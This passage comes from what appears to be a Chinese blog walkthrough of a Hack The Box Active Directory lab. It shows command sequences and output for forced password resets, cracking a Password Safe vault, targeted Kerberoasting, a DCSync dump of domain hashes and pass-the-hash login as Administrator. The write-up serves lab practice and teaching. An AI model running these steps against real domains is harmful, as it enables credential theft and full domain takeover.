+<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><h5 id="Olivia-michael"><a href="#Olivia-michael" class="headerlink" title="Olivia-&gt;michael"></a>Olivia-&gt;michael</h5><p>GenericAll 权限相当于“完全控制”权限，意味着 olivia 可以完全控制 michael 用户，包括修改密码和组成员等操作。</p>
+<p>使用<code>evil-winrm</code>登录<code>olivia</code>用户，修改域内用户<code>michael</code>的密码为<code>michael</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; net user michael michael /domain </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
+
+<p>成功登录，拿下<code>michael</code>用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/HTB/Administrator]</span><br><span class="line">└─# evil-winrm -i 10.10.11.42 -u &#x27;michael&#x27; -p &#x27;michael&#x27;</span><br><span class="line">*Evil-WinRM* PS C:\Users\michael\Documents&gt; whoami</span><br><span class="line">administrator\michael</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168422913-bead28a8-64b4-41e3-897a-32cccbfbd8d7.png"></p>
+<h5 id="michael-benjamin"><a href="#michael-benjamin" class="headerlink" title="michael-&gt;benjamin"></a>michael-&gt;benjamin</h5><p>ForceChangePassword</p>
+<p>打开bloodhound，查看<code>michael</code>用户，发现该用户也有一个FDOC，并且该FDOC对<code>benjamin</code>用户具有<code>ForceChangePassword</code>权限，即可以强制更改<code>benjamin</code>的密码。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168679332-60dc56c5-0297-44d4-aee9-a571c6f0bdf8.png"></p>
+<p>ftp登录benjamin</p>
+<p>在<code>bloodhound</code>中查看<code>benjamin</code>没有任何权限，但是他是<code>share Moderator</code>组的成员，可以尝试一下<code>ftp</code>连接</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168926833-e9c62747-0bf6-411e-8eba-19656aadb99e.png"></p>
+<p>接下来使用ftp登录<code>michael</code>账户，</p>
+<p>ftp</p>
+<p>rpcclient</p>
+<p><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/48320">https://www.secrss.com/articles/48320</a></p>
+<p>先修改密码</p>
+<h5 id="benjamin-emily"><a href="#benjamin-emily" class="headerlink" title="benjamin-&gt;emily"></a>benjamin-&gt;emily</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -u &quot;michael&quot; -p &quot;michael&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;benjamin&quot; &quot;12345678&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/HTB/Administrator]</span><br><span class="line">└─# rpcclient -U michael 10.10.11.42</span><br><span class="line">Password for [WORKGROUP\michael]:</span><br><span class="line">rpcclient $&gt; setuserinfo2 benjamin 23 &#x27;benjamin&#x27;</span><br><span class="line">rpcclient $&gt; exit</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">└─# ftp benjamin@10.10.11.42</span><br><span class="line">Connected to 10.10.11.42.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">331 Password required</span><br><span class="line">Password: </span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br></pre></td></tr></table></figure>
+
+<p>ftp登录之后，查看一下当前目录下的文件，发现一个备份文件<code>Backup.psafe3</code>，将它下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; dir</span><br><span class="line">ftp&gt; binary  #切换成二进制模式传输文件</span><br><span class="line">200 Type set to I.</span><br><span class="line">ftp&gt; get Backup.psafe3</span><br><span class="line">local: Backup.psafe3 remote: Backup.psafe3</span><br><span class="line">229 Entering Extended Passive Mode (|||51246|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">100% |**********************************************************************************************|   952        0.77 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">952 bytes received in 00:01 (0.77 KiB/s)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734169943968-96a14c7b-6c34-4c33-a401-cb42f0b3d7a7.png"></p>
+<p>在哪打开终端就会下到哪个目录下</p>
+<p>psafe3 文件是加密的密码安全文件</p>
+<p>无法直接读取，需要使用 <code>pwsafe2john</code> 工具进行获取 hash，卡 kali 自带有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Administrator]</span><br><span class="line">└─# pwsafe2john Backup.psafe3  </span><br><span class="line">Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050</span><br></pre></td></tr></table></figure>
+
+<p>拿到 hash，尝试进行解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Administrator]</span><br><span class="line">└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])</span><br><span class="line">Cost 1 (iteration count) is 2048 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">tekieromucho     (Backu)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-12-05 23:24) 4.761g/s 29257p/s 29257c/s 29257C/s newzealand..iheartyou</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734170433273-6bbaf1e7-77d7-4785-a511-a82311921ab8.png"></p>
+<p>用本机的软件</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734171146786-b9d44411-5cc5-4587-98d9-6f49a1cbb63a.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</span><br><span class="line">emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb</span><br><span class="line">emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>emily</code>的密码为：<code>UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></p>
+<p>使用<code>evil-winrm</code>登录<code>emily</code>用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/HTB/Administrator]</span><br><span class="line">└─# evil-winrm -i 10.10.11.42 -u &#x27;emily&#x27; -p &#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Documents&gt; whoami</span><br><span class="line">administrator\emily</span><br></pre></td></tr></table></figure>
+
+<p>成功拿下emily权限，进入桌面目录，拿下第一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\emily\Documents&gt; cd ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\emily\Desktop</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk</span><br><span class="line">-ar---         12/7/2024  12:20 AM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Desktop&gt; cat user.txt</span><br><span class="line">888ac3b3d60b08fa502ca90c9e90d506</span><br></pre></td></tr></table></figure>
+
+<h5 id="emily-ethan"><a href="#emily-ethan" class="headerlink" title="emily-&gt;ethan"></a>emily-&gt;ethan</h5><p>再次查看<code>bloodhound</code>，<code>emily</code>有一个FDOC，对用户<code>ethan</code>拥有<code>GenericWrite</code>权限。</p>
+<p>在 Active Directory (AD) 环境中，GenericWrite 是一种权限，允许攻击者对目标账户的属性进行修改。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734171554355-7f2a77cf-4151-42f7-a7c7-bd92bbde3ba5.png"></p>
+<p>这里介绍一下<code>Kerberoasting攻击</code></p>
+<p>Kerberos 协议在处理身份验证时，允许域内用户为拥有 <code>SPN</code>(Service Principal Name，标识服务实例的唯一名称) 的账户请求服务票据。</p>
+<p>这些票据通常是由账户的 NTLM 哈希加密生成的，只要域账户注册了<code>SPN</code>，攻击者就可以使用<code>Kerberos</code>请求服务票据并提取票据。因此攻击者可以通过离线破解服务票据(例如使用工具 <code>PowerView</code> 或 <code>GetUserSPNs.py</code>)间接得到目标账户的密码。</p>
+<p>但是这里我们没有看到<code>ethan</code>用户注册<code>SPN</code>，因此我们只能通过<code>GenericWrite</code>为<code>ethan</code>用户创建一个<code>SPN</code>，然后请求一个票据并使用<code>targetedKerberoast.py</code>破解它。</p>
+<p>targetedKerberoast.py下载链接：<a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/targetedKerberoast">https://github.com/ShutdownRepo/targetedKerberoast</a></p>
+<p>先更新一下时间，不然会有时差，导致破解失败</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# ntpdig 10.10.11.42</span><br><span class="line">2024-12-15 02:22:47.084508 (+0800) +25206.101334 +/- 0.209603 10.10.11.42 s1 no-leap</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# ntpdate 10.10.11.42</span><br><span class="line">2024-12-15 02:23:04.429985 (+0800) +25206.072243 +/- 0.240176 10.10.11.42 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25206.072243</span><br></pre></td></tr></table></figure>
+
+<p>创建SPN</p>
+<p>Set-ADUser -Identity ethan -ServicePrincipalNames @{ADD&#x3D;”opsSPN&#x2F;host”}</p>
+<p>破解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/targetedKerberoast-main]</span><br><span class="line">└─# python targetedKerberoast.py -u &quot;emily&quot; -p &quot;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&quot; -d &quot;Administrator.htb&quot; --dc-ip 10.10.11.42</span><br><span class="line">[*] Starting kerberoast attacks</span><br><span class="line">[*] Fetching usernames from Active Directory with LDAP</span><br><span class="line">[+] Printing hash for (ethan)</span><br><span class="line">$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$c272d2d4f6c0ecab1c52f9c3a61a7752$80ac44b67f02b88210f31a575ec0c3e8ef7a74fa05eea49a2afe46ae6a8085a0c8fc51ab9f1d0ae4849aae9dd2880b46a2cf1f7a1c9b2ba5639cb58c0f7e4e2b5474cda1e70fae234f89807cc8d2b7972079899077da12b0a662439fd592504c4d942759de88d5b8f93ee57f3306444ceba8b69c934d9ad5de4d98fe198b63fcda638a2b2dde3b246b7e34974e600c843c44ed41034ada89298d3081ba78d23aca4adad45aa123840df2de7ddab67f0138ca0c96dc712a927e5dbc2123709f7c5873f025912727e2212671ad3f5f37a10e6fd65cf93ac77d514acd615f105f977eb6afb1ab3917415f0a86f21137569fa23131d295be7478e34c29048fadf4875a2029e89d7c10f743e589521982eb9928beb8df8b1273c44eac940910aea9fbb046900897eac2476d33874ce71713016a7f879fcdedcdacdcc1d079fceb0235d909e77416760aa14918853bca87d9801ea1364bb8bfa9b9ff8bdfaae3a227d214832c8c8c787ea304e0aaa43828428b5f976569b8aa809adbdecc775f2edb41b2276b895ccc189675eae246123f5e903bb6cf5c35f641a244698a405999faae73096ad9bbee2e9d5427e2ac169350d5172578482327a326708d019348520750a144a90f7684aa4a2557ede1bb4ba25a6a2ed9bfc24acee897e8cd52db8e10232518e8201dc5b39317ea892ae6b4db81a1e75c70bf99b8b3d8b83a35bd664a8e387e1ae092844dc62420c418b9b3790071908d9131b79e242bfd33489318278460ed861ce63b3c51a3cf7f4b6122083db3e30dcd9a4e088ddda78d9bf337d0e1ede8192e0aa6ddc436a658f8ab92c4a7c4684352dd873159cbb830d703f46b7f2f86d63f5f512867a3298df24f7ffa7276865fc5e8affa0944b44e7691482e66934b8f32cbe4b6033a1145164b2c12dbc1f6ccec70076b61dc21f40f7f9b22f3daf6cacab4073dd5365f617255df7fb89b948e41c12fdd251508ed2c537a268595a10f012b5ca1b783dbdc238b375b215404dee90122627e1cbd8982fcc34fef8f0c0073f4391aff527e5be543ce4678bdc22b8bd1a7373b017680060552ea8a2f703a9fdfaf4f81370f9b5d3c21d2f50e3975c2246965047642679258a429adcf05ec61dfb6852148b53cdb741e752d0d716625956c4504e99a915bdb27cba9970e6ae8f5af1249fef2a3c8c935daae78e1413378894c4f18429b7cee5fdb3e9dabd30155253e0efe850f47baea504f3b74247617d62de7a482ad245b1d5d43fdbf2ddabc18e7da4a381cdf51f9d2d6d2c953bbfd73e57af2e59dcec4194cf03cf8ca8e8098319c2941069d0b11fab87292e0ef94aad811b662c541d25dcb629b1466d4133cfec0e5f9c21180cc74e80170707fd45cff021430187b4cfcdc5120f568567ad80f8a705446cb355ed2d49af31fe8825e65e5dcdc659fd78d4856f89a8ea2179fd30b9c802d3a16b378c6ab39c738de3d454b2649f2e6a33f7fdec9c866ca59f3fc50924aa5a21e7a4a4852cd159aca2c03d0f100b355a21ee9</span><br></pre></td></tr></table></figure>
+
+<p>解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Administrator]</span><br><span class="line">└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">limpbizkit       (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-12-06 17:35) 100.0g/s 512000p/s 512000c/s 512000C/s newzealand..babygrl</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734175893236-95d7ed55-3eee-4c84-a028-55cec189d4c9.png">得到 Ethan 的密码：<code>limpbizkit</code></p>
+<h5 id="Ethan-Administrator"><a href="#Ethan-Administrator" class="headerlink" title="Ethan-&gt;Administrator"></a>Ethan-&gt;Administrator</h5><p>现在我们已经获取了<code>ethan</code> 的密码，使用 BloodHound 检查他的权限。发现<code>ethan</code> 的 FDOC权限间接赋予了他在域控制器 (Domain Controller, DC) 上的<code>DCSync</code>权限。</p>
+<p>DCSync 是一种滥用 Active Directory (AD) 复制机制的攻击技术。拥有 DCSync 权限的用户可以模拟域控制器，向其他 DC 请求复制敏感数据，如 NTLM 哈希和 Kerberos 密钥。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734176432890-2d7999a1-2f33-4d75-a09f-e22efaf18d64.png"></p>
+<p>借助<code>DCSync</code>，使用<code>impacket-secretsdump</code>转储域控制器上的所有密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">└─# impacket-secretsdump ethan:limpbizkit@10.10.11.42</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::</span><br><span class="line">administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::</span><br><span class="line">administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:e55bcd70f1b548fc4304ebd8a3f2f2f7:::</span><br><span class="line">administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::</span><br><span class="line">administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::</span><br><span class="line">administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::</span><br><span class="line">administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::</span><br><span class="line">administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2</span><br><span class="line">Administrator:des-cbc-md5:403286f7cdf18385</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94</span><br><span class="line">krbtgt:des-cbc-md5:2c0bc7d0250dbfc7</span><br><span class="line">administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3</span><br><span class="line">administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48</span><br><span class="line">administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9</span><br><span class="line">administrator.htb\michael:aes256-cts-hmac-sha1-96:dec0f5eac8b174633aa1449c41abdd0170098d31f2c38242675c6ad80873a229</span><br><span class="line">administrator.htb\michael:aes128-cts-hmac-sha1-96:4d614f91ce0d82e332d76139b19ec03b</span><br><span class="line">administrator.htb\michael:des-cbc-md5:49f10d5d97f19d5d</span><br><span class="line">administrator.htb\benjamin:aes256-cts-hmac-sha1-96:e110f75337181474608f51a5b22d8198d3fa56d68633b384b7136d4496c89337</span><br><span class="line">administrator.htb\benjamin:aes128-cts-hmac-sha1-96:aa2b24ac2fb879262faa4f6ca294f332</span><br><span class="line">administrator.htb\benjamin:des-cbc-md5:1a4f0bce2343cebf</span><br><span class="line">administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4</span><br><span class="line">administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218</span><br><span class="line">administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51</span><br><span class="line">administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f</span><br><span class="line">administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f</span><br><span class="line">administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb</span><br><span class="line">administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6</span><br><span class="line">administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade</span><br><span class="line">administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf</span><br><span class="line">administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82</span><br><span class="line">administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e</span><br><span class="line">administrator.htb\emma:des-cbc-md5:3249fba89813ef5d</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d</span><br><span class="line">DC$:des-cbc-md5:f483547c4325492a</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
+<p>现在已经拥有了<code>Administrator</code>的哈希值，使用<code>evil-winrm</code>登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/secretsdump.py-main]</span><br><span class="line">└─# evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami</span><br><span class="line">administrator\administrator</span><br></pre></td></tr></table></figure>
+
+<p>成功登录<code>administrator</code>用户，切换到桌面目录，发现root.txt，拿下第二个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-ar---        12/13/2024  11:45 PM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt</span><br><span class="line">c453aa7121957348d4d4f383383f48fe</span><br></pre></td></tr></table></figure>
+
+<h3 id="恢复时间"><a href="#恢复时间" class="headerlink" title="恢复时间"></a>恢复时间</h3><p><a target="_blank" rel="noopener" href="https://www.bdpnt.com/kepu/2667.html">https://www.bdpnt.com/kepu/2667.html</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E7%88%86%E7%A0%B4"><span class="toc-number">1.</span> <span class="toc-text">smb爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM-%E7%99%BB%E5%BD%95olivia"><span class="toc-number">2.</span> <span class="toc-text">WinRM 登录olivia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E7%88%86%E7%A0%B4"><span class="toc-number">3.</span> <span class="toc-text">域用户爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-number">4.</span> <span class="toc-text">获取权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BloodHound-%E6%8F%90%E5%8F%96%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">BloodHound 提取域信息</span></a></li><li class="toc-item 